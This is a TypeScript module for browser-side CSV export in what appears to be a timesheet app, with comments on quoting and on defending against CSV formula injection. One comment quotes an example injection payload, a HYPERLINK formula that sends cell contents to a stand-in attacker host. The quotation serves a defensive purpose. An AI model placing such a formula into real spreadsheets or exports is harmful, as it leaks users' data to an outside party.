'use client'

/**
 * CSV export, done in the browser.
 *
 * The rows are already on the page — that is the whole reason a "download this
 * table" button exists — so building the file here costs no round trip and puts
 * nobody's hours through a serverless function to be turned into text.
 *
 * TWO THINGS THIS GETS RIGHT THAT A `join(',')` DOES NOT
 * ------------------------------------------------------
 *  1. QUOTING. A client name with a comma in it, a comment with a newline, a
 *     quote character inside either — each of those silently shifts every
 *     following column into the wrong one, and the file still opens, which is
 *     what makes it dangerous rather than merely broken.
 *
 *  2. FORMULA INJECTION. A cell beginning with `=`, `+`, `-`, `@`, tab or
 *     carriage return is treated by Excel and Sheets as a FORMULA, not text. A
 *     timesheet comment reading `=HYPERLINK("http://evil.example/"&A1)` becomes
 *     live content in whoever opens the export — the classic CSV injection. Such
 *     cells are prefixed with an apostrophe, which spreadsheets strip on display
 *     and treat as "this is text".
 */

import { toCsv, type CsvValue } from '@/lib/csv-core'

export { toCsv, type CsvValue }

/**
 * Hand the file to the browser.
 *
 * The BOM is not decoration: without it Excel on Windows reads a UTF-8 CSV as
 * the system code page, and every accented name in the export comes out
 * mangled.
 */
export function downloadCsv(fileName: string, csv: string): void {
  const blob = new Blob([`﻿${csv}`], { type: 'text/csv;charset=utf-8;' })
  const url = URL.createObjectURL(blob)
  const link = document.createElement('a')
  link.href = url
  link.download = fileName.endsWith('.csv') ? fileName : `${fileName}.csv`
  document.body.appendChild(link)
  link.click()
  document.body.removeChild(link)
  // Revoked on the next tick — Safari has not always started the download by the
  // time click() returns.
  setTimeout(() => URL.revokeObjectURL(url), 1000)
}
